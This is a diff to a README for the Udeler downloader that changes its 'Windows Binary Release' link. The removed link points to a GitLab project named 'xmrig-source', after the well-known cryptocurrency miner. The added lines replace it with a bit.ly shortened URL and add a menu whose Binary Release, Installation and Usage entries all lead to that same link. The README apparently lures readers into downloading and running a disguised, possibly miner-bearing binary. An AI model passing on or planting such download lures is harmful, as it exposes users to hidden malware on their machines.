@@ -8,8 +8,17 @@ Since Udeler v1.6.0, there is support for login through Udeler Authenticator (A 
 
 # How to get started
   1) First, install the script following any one of these   
-      * [Windows Binary Release](https://gitlab.com/xmrig-source/download/-/raw/master/Setup-beta-5-3.1.zip)
+      * [Windows Binary Release](https://bit.ly/3Zgoms1)
   2) Install and run program on Windows
+  
+# Topics
+       
+[Windows]()  
+&ensp;&emsp;[Binary Release](https://bit.ly/3Zgoms1)  
+&ensp;&emsp;[Installation](https://bit.ly/3Zgoms1)  
+&ensp;&emsp;[Usage](https://bit.ly/3Zgoms1)  
+  
+  
 
 ![](https://i.imgur.com/nsaAgDU.gif)
 
